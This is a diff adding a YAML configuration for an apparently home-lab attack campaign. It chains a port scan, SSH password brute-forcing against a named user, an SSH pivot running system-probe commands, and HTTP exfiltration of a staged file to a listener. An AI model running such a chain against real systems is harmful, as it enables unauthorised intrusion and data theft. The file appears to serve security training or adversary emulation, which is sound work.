@@ -1,0 +1,40 @@
+# campaigns/homelab_integrated.yaml
+#
+# The working 5-stage integrated lab campaign.
+# Variables are resolved at runtime from CLI prompts or --flags.
+# DO NOT hardcode credentials or IPs here.
+
+campaign: homelab_integrated
+
+stages:
+  - module: reconnaissance.port_scan:PortScan
+    params:
+      target: "${TARGET_IP}"
+      port_range: "20-30"
+      timeout: 0.2
+
+  - module: credential_access.ssh_brute:SSHBruteForce
+    params:
+      target: "${TARGET_IP}"
+      port: "${SSH_PORT}"
+      username: "fareed"
+      wordlist: "wordlists/passwords.txt"
+      timeout: 3.0
+      stop_on_first: true
+    continue_on_failure: false
+
+  - module: lateral_movement.ssh_pivot:SSHPivot
+    params:
+      target: "${TARGET_IP}"
+      port: "${SSH_PORT}"
+      probe_command: "id && hostname && uname -a"
+
+  - module: exfiltration.local_file_stage:LocalFileStage
+    params:
+      paths:
+        - "testdata/stage4-test.txt"
+
+  - module: exfiltration.http_exfil:HTTPExfil
+    params:
+      listener_url: "http://${TARGET_IP}:${RECEIVER_PORT}/upload"
+      archive_name: "stage4-homelab-test.zip"
